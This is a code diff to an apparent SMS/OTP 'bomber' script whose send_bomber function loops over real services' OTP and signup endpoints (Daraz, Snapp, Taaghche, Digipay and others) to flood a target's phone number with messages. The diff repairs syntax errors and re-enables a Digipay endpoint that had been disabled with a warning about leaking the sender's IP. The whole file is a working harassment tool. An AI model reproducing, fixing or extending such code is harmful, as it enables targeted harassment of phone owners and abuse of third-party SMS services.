@@ -123,7 +123,7 @@ def send_bomber(mobile):
                     "msisdn": "{target}"
                 },
                 "identifier": "OTP Send Successfully"
-            ],
+            },
             {
                 "name": "Daraz Nepal",
                 "method": "POST",
@@ -548,7 +548,7 @@ def send_bomber(mobile):
                     "email": "test@example.com"
                 },
                 "identifier": "success"
-        ],
+        },
             {
                 "name": "twitter",
                 "method": "POST",
@@ -585,7 +585,7 @@ def send_bomber(mobile):
                 "name": "whatsapp",
                 "method": "POST",
                 "url": "https://web.whatsapp.com/api/check",
-            }
+            },
         {
             "name": "Snapp V2",
             "method": "POST",
@@ -823,12 +823,12 @@ def send_bomber(mobile):
             "url": "https://gw.taaghche.com/v4/site/auth/signup",
             "data": {"contact": mobile},
         },
-        # {
-        #     "name": "Digipay",
-        #     "method": "POST",
-        #     "url": "https://www.mydigipay.com/digipay/api/users/send-sms",
-        #     "data": {"cellNumber": mobile},
-        # }, # This one will send your IP to your target.
+        {
+             "name": "Digipay",
+             "method": "POST",
+             "url": "https://www.mydigipay.com/digipay/api/users/send-sms",
+             "data": {"cellNumber": mobile},
+         },
     ]
     for api in apis:
         try:
